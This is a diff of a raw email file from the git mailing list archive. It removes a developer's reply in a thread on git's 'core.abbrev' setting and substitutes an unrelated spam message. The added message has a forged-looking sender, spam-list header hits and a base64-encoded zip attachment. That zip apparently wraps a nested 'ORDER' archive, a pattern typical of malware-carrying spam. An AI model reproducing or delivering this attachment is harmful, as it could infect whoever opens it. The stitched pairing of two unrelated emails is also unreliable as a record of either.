@@ -1,87 +1,113 @@
 Return-Path: <git-owner@vger.kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on dcvr.yhbt.net
-X-Spam-Level: 
+X-Spam-Level: *
 X-Spam-ASN: AS31976 209.132.180.0/23
-X-Spam-Status: No, score=-5.3 required=3.0 tests=AWL,BAYES_00,DKIM_SIGNED,
-	DKIM_VALID,DKIM_VALID_AU,FREEMAIL_FORGED_FROMDOMAIN,FREEMAIL_FROM,
-	HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,RCVD_IN_SORBS_SPAM,
-	RP_MATCHES_RCVD shortcircuit=no autolearn=ham autolearn_force=no version=3.4.0
+X-Spam-Status: No, score=1.3 required=3.0 tests=BAYES_40,
+	HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,RCVD_IN_SBL,RCVD_IN_SBL_CSS,
+	RP_MATCHES_RCVD,ZIPFILE shortcircuit=no autolearn=no autolearn_force=no
+	version=3.4.0
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by dcvr.yhbt.net (Postfix) with ESMTP id 14A761F935
-	for <e@80x24.org>; Mon, 26 Sep 2016 07:16:21 +0000 (UTC)
+	by dcvr.yhbt.net (Postfix) with ESMTP id DD9AF209AA
+	for <e@80x24.org>; Mon, 26 Sep 2016 10:43:18 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1761003AbcIZHNf (ORCPT <rfc822;e@80x24.org>);
-        Mon, 26 Sep 2016 03:13:35 -0400
-Received: from mail-wm0-f44.google.com ([74.125.82.44]:38864 "EHLO
-        mail-wm0-f44.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1757067AbcIZHNe (ORCPT <rfc822;git@vger.kernel.org>);
-        Mon, 26 Sep 2016 03:13:34 -0400
-Received: by mail-wm0-f44.google.com with SMTP id l132so132472462wmf.1
-        for <git@vger.kernel.org>; Mon, 26 Sep 2016 00:13:33 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20120113;
-        h=mime-version:in-reply-to:references:from:date:message-id:subject:to
-         :cc;
-        bh=IBd+ecCoKnNe7QHykvOZELXFBd5ZG3rM3N0LGzK/Y4Q=;
-        b=KHJsoQHO93BI5Nc27k+8F/lOyD3R0l8Dsa9VJtFWFky2xH3vfhX0+5Zv+EFmkv0826
-         jFCwIGGS8NxrdKGZrMXVyDqTV6JzZd9bLulhLIvc20m+ky4E2dFYA1YA+LiziXWtlM05
-         iojS/BUXCP1B7RbHVG6sCOKgiAjNOm2pKYGjBU815yf0RP/05/ih69Xwg5CqOLr5Uy1e
-         u+HmhmFqyFLTJsNQWA8Zgk0HCcEjxpfaaPTG1rnvdu+VspmiAFxnAKyHHwoDgsTB5vWv
-         NX7wviEPOcZi8Ki/eY3HEXPnCvzSaJegxacdB5wFHxb+rQ7Djahre62azqNfnpGOkj4D
-         2SFw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
-         :message-id:subject:to:cc;
-        bh=IBd+ecCoKnNe7QHykvOZELXFBd5ZG3rM3N0LGzK/Y4Q=;
-        b=JTsdCsipoiCM3ziJPjf6EmCqiqHS64Kb9WUbQ1osvY2IdRTJl56T9M7nBKZcJ0x554
-         TWzPkOwgRVoQyauEmfxEZnHDxeUuxU3+WBHkKmetFZLLUOQSTltgOegEsLOC7lh6R8aH
-         jtnpyEbdLZ3bWAhRPJNiSVnu26av4qPFlpYDf466Bl4uhAzhOQt69XauBonLST/LKDUK
-         7lce05/7eNr5vyLOFE2q/SNMo11yGP+RNGQ1xK6/YxCeHxsT4pOLhNKWUlZjIjRQ8VBM
-         raCrtL7KoTw4VIRnw1LK5ae2i7vSyxyeFyC8kK2/4lFhGL9Xp76TqCPidUtkuG8ZVms0
-         /6zQ==
-X-Gm-Message-State: AA6/9RkRkPgT0Oxq+hYHF4EW87zHVi9AalrMz/+GE572gAfZt6bejr6n2+sYHDoiCLXtZSajJ424CC6g1eJj8Q==
-X-Received: by 10.28.22.138 with SMTP id 132mr11986037wmw.7.1474874012652;
- Mon, 26 Sep 2016 00:13:32 -0700 (PDT)
+        id S965941AbcIZKnQ (ORCPT <rfc822;e@80x24.org>);
+        Mon, 26 Sep 2016 06:43:16 -0400
+Received: from 116-94-184-177.redewsp.com.br ([177.184.94.116]:60367 "HELO
+        araxinfo.com" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S933368AbcIZKnQ (ORCPT <rfc822;git@vger.kernel.org>);
+        Mon, 26 Sep 2016 06:43:16 -0400
+X-Greylist: delayed 300 seconds by postgrey-1.27 at vger.kernel.org; Mon, 26 Sep 2016 06:43:13 EDT
+Message-ID: <147488658634.17353.2920266422535264848@araxinfo.com>
+From:   <zzluckylane@sbcglobal.net>
+To:     <git@vger.kernel.org>
+Subject: 50273 git
+Date:   Mon, 26 Sep 2016 10:43:06 -0000
+Importance: High
 MIME-Version: 1.0
-Received: by 10.194.38.132 with HTTP; Mon, 26 Sep 2016 00:13:32 -0700 (PDT)
-In-Reply-To: <CA+55aFy0_pwtFOYS1Tmnxipw9ZkRNCQHmoYyegO00pjMiZQfbg@mail.gmail.com>
-References: <CA+55aFy0_pwtFOYS1Tmnxipw9ZkRNCQHmoYyegO00pjMiZQfbg@mail.gmail.com>
-From:   Christian Couder <christian.couder@gmail.com>
-Date:   Mon, 26 Sep 2016 09:13:32 +0200
-Message-ID: <CAP8UFD3UDm_CT2_4YYeQ+-gdC2kJPp7v0k5hZOB4oALUzR-JPg@mail.gmail.com>
-Subject: Re: Changing the default for "core.abbrev"?
-To:     Linus Torvalds <torvalds@linux-foundation.org>
-Cc:     Junio C Hamano <gitster@pobox.com>,
-        Git Mailing List <git@vger.kernel.org>,
-        =?UTF-8?B?w4Z2YXIgQXJuZmrDtnLDsCBCamFybWFzb24=?= <avarab@gmail.com>
-Content-Type: text/plain; charset=UTF-8
+Content-Type: application/zip; name="EMAIL_343269780770378_git.zip"
+Content-Disposition: attachment
+Content-Transfer-Encoding: base64
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
 
-On Mon, Sep 26, 2016 at 3:39 AM, Linus Torvalds
-<torvalds@linux-foundation.org> wrote:
->
-> The kernel, these days, is at roughly 5 million objects, and while the
-> seven hex digits are still often enough for uniqueness (and git will
-> always add digits *until* it is unique), it's long been at the point
-> where I tell people to do
->
->     git config --global core.abbrev 12
->
-> because even though git will extend the seven hex digits until the
-> object name is unique, that only reflects the *current* situation in
-> the repository. With 5 million objects and a very healthy growth rate,
-> a 7-8 hex digit number that is unique today is not necessarily unique
-> a month or two from now, and then it gets annoying when a commit
-> message has a short git ID that is no longer unique when you go back
-> and try to figure out what went wrong in that commit.
-
-AEvar sent a patch recently
-(https://public-inbox.org/git/20160921114428.28664-3-avarab@gmail.com/)
-to have gitweb link to "git describe"'d commits in log messages, and
-this makes me wonder if it woudn't be better for the kernel to also
-use the output of a command like `git describe --verylong` or `git
-describe --long=12` instead of a regular git ID in commit messages.
+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
+AFBLBQYAAAAAAQABAFQAAAALEQAAAAA=
